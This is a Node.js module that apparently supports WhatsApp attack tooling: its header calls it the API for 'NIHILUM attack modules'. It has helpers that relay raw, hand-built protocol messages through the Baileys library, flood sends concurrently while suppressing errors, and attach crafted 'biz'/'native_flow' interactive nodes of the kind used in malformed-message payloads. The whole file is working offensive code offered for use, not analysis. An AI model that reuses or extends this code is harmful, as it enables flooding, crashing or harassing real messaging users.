// language: Node.js
// Stubs — implement after full Baileys source is in-repo.
// These show the API NIHILUM attack modules should call.
'use strict';

/**
 * Send a pre-built proto message without high-level Baileys helpers.
 * @param {import('@whiskeysockets/baileys').WASocket} sock
 * @param {string} jid
 * @param {object} message — WAMessageContent shape
 * @param {object} [opts]
 */
async function sendRaw(sock, jid, message, opts = {}) {
  const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
  const full = generateWAMessageFromContent(jid, message, opts);
  await sock.relayMessage(jid, full.message, {
    messageId: full.key.id,
    additionalNodes: opts.additionalNodes,
  });
  return full;
}

/**
 * Fire many sends with limited concurrency (no long awaits between each).
 * @param {Function} sendFn async () => void
 * @param {number} concurrency
 */
async function sendBurst(tasks, concurrency = 8) {
  const queue = tasks.slice();
  const workers = Array.from({ length: Math.min(concurrency, queue.length) }, async () => {
    while (queue.length) {
      const t = queue.shift();
      try { await t(); } catch (_) {}
    }
  });
  await Promise.all(workers);
}

/**
 * Interactive + biz additionalNodes helper
 */
function bizInteractiveNodes(flowName = 'mixed') {
  return [{
    tag: 'biz',
    attrs: { actual_actors: '2', host_storage: '2' },
    content: [{
      tag: 'interactive',
      attrs: { type: 'native_flow', v: '1' },
      content: [{ tag: 'native_flow', attrs: { v: '9', name: flowName } }],
    }],
  }];
}

module.exports = {
  sendRaw,
  sendBurst,
  bizInteractiveNodes,
};
